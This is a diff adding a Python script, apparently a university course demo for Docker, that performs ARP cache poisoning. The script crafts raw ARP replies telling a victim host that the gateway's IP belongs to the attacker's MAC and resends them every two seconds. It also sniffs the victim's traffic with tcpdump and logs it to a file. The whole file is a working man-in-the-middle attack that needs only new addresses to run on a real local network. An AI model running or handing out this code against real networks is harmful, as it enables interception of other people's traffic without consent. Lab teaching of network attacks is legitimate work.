@@ -1,0 +1,191 @@
+#!/usr/bin/env python3
+"""
+Simple ARP Cache Poisoning Attack for Docker Demo
+CSE406 Project - Quick Demo Version
+"""
+
+import socket
+import struct
+import time
+import threading
+import subprocess
+import sys
+from datetime import datetime
+
+class SimpleARPAttack:
+    def __init__(self):
+        self.victim_ip = "192.168.1.50"
+        self.victim_mac = None
+        self.gateway_ip = "192.168.1.1"
+        self.gateway_mac = None
+        self.attacker_mac = None
+        self.poisoning = False
+        
+    def get_mac_address(self, ip):
+        """Get MAC address for IP"""
+        try:
+            # Use ARP command
+            result = subprocess.run(['arp', '-n', ip], 
+                                  capture_output=True, text=True)
+            if result.returncode == 0:
+                for line in result.stdout.split('\n'):
+                    if ip in line:
+                        parts = line.split()
+                        for part in parts:
+                            if ':' in part and len(part) >= 17:
+                                return part.lower()
+        except:
+            pass
+        return "aa:bb:cc:dd:ee:02"  # Default for demo
+    
+    def get_interface_info(self):
+        """Get local interface information"""
+        try:
+            result = subprocess.run(['ip', 'route', 'show', 'default'], 
+                                  capture_output=True, text=True)
+            # Get interface name
+            interface = "eth0"  # Default for containers
+            
+            # Get MAC address
+            result = subprocess.run(['cat', f'/sys/class/net/{interface}/address'], 
+                                  capture_output=True, text=True)
+            self.attacker_mac = result.stdout.strip()
+            
+            print(f"[+] Attacker MAC: {self.attacker_mac}")
+            return interface
+        except:
+            return "eth0"
+    
+    def create_arp_packet(self, target_mac, target_ip, sender_ip, sender_mac):
+        """Create ARP poison packet"""
+        # Ethernet header
+        eth_dst = bytes.fromhex(target_mac.replace(':', ''))
+        eth_src = bytes.fromhex(sender_mac.replace(':', ''))
+        eth_type = struct.pack('!H', 0x0806)  # ARP
+        eth_header = eth_dst + eth_src + eth_type
+        
+        # ARP packet
+        hw_type = struct.pack('!H', 1)      # Ethernet
+        proto_type = struct.pack('!H', 0x0800)  # IPv4
+        hw_len = struct.pack('!B', 6)       # MAC length
+        proto_len = struct.pack('!B', 4)    # IP length
+        operation = struct.pack('!H', 2)    # ARP Reply
+        
+        sender_mac_bytes = bytes.fromhex(sender_mac.replace(':', ''))
+        sender_ip_bytes = socket.inet_aton(sender_ip)
+        target_mac_bytes = bytes.fromhex(target_mac.replace(':', ''))
+        target_ip_bytes = socket.inet_aton(target_ip)
+        
+        arp_packet = (hw_type + proto_type + hw_len + proto_len + operation +
+                     sender_mac_bytes + sender_ip_bytes + 
+                     target_mac_bytes + target_ip_bytes)
+        
+        return eth_header + arp_packet
+    
+    def poison_arp_cache(self):
+        """Main ARP poisoning function"""
+        interface = self.get_interface_info()
+        
+        # Get victim MAC
+        self.victim_mac = self.get_mac_address(self.victim_ip)
+        print(f"[+] Victim MAC: {self.victim_mac}")
+        
+        print(f"[+] Starting ARP poisoning attack...")
+        print(f"[+] Target: {self.victim_ip} ({self.victim_mac})")
+        print(f"[+] Spoofing gateway: {self.gateway_ip}")
+        
+        try:
+            # Create raw socket
+            sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW)
+            sock.bind((interface, 0))
+            
+            poison_count = 0
+            
+            while self.poisoning:
+                # Create poison packet (tell victim that gateway is at our MAC)
+                poison_packet = self.create_arp_packet(
+                    self.victim_mac,     # Send to victim
+                    self.victim_ip,      # Victim IP
+                    self.gateway_ip,     # Claim to be gateway
+                    self.attacker_mac    # Our MAC
+                )
+                
+                # Send poison packet
+                sock.send(poison_packet)
+                poison_count += 1
+                
+                timestamp = datetime.now().strftime('%H:%M:%S')
+                print(f"[{timestamp}] Poison packet #{poison_count} sent")
+                
+                time.sleep(2)  # Send every 2 seconds
+                
+        except Exception as e:
+            print(f"[-] Error: {e}")
+        finally:
+            sock.close()
+    
+    def monitor_traffic(self):
+        """Monitor network traffic"""
+        print(f"[+] Starting traffic monitoring...")
+        
+        try:
+            # Use tcpdump to monitor traffic
+            cmd = ['tcpdump', '-i', 'eth0', '-n', f'host {self.victim_ip}']
+            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, 
+                                     stderr=subprocess.PIPE, text=True)
+            
+            while self.poisoning:
+                line = process.stdout.readline()
+                if line:
+                    timestamp = datetime.now().strftime('%H:%M:%S')
+                    print(f"[{timestamp}] TRAFFIC: {line.strip()}")
+                    
+                    # Log to file
+                    with open('/opt/tools/traffic_log.txt', 'a') as f:
+                        f.write(f"[{timestamp}] {line}")
+                        
+        except Exception as e:
+            print(f"[-] Traffic monitoring error: {e}")
+    
+    def start_attack(self, duration=300):  # 5 minutes default
+        """Start the complete attack"""
+        print("="*60)
+        print("Simple ARP Cache Poisoning Attack")
+        print("CSE406 Project - Docker Demo")
+        print("="*60)
+        
+        self.poisoning = True
+        
+        # Start ARP poisoning in background
+        poison_thread = threading.Thread(target=self.poison_arp_cache)
+        poison_thread.daemon = True
+        poison_thread.start()
+        
+        # Start traffic monitoring
+        monitor_thread = threading.Thread(target=self.monitor_traffic)
+        monitor_thread.daemon = True
+        monitor_thread.start()
+        
+        try:
+            print(f"[+] Attack running for {duration} seconds...")
+            print("[+] Press Ctrl+C to stop early")
+            time.sleep(duration)
+        except KeyboardInterrupt:
+            print("\n[+] Attack stopped by user")
+        
+        self.poisoning = False
+        print("[+] Attack completed")
+
+def main():
+    # Check if running as root
+    if os.geteuid() != 0:
+        print("[-] This script requires root privileges")
+        print("[+] Run with: sudo python3 simple_arp_attack.py")
+        sys.exit(1)
+    
+    attack = SimpleARPAttack()
+    attack.start_attack()
+
+if __name__ == "__main__":
+    import os
+    main()
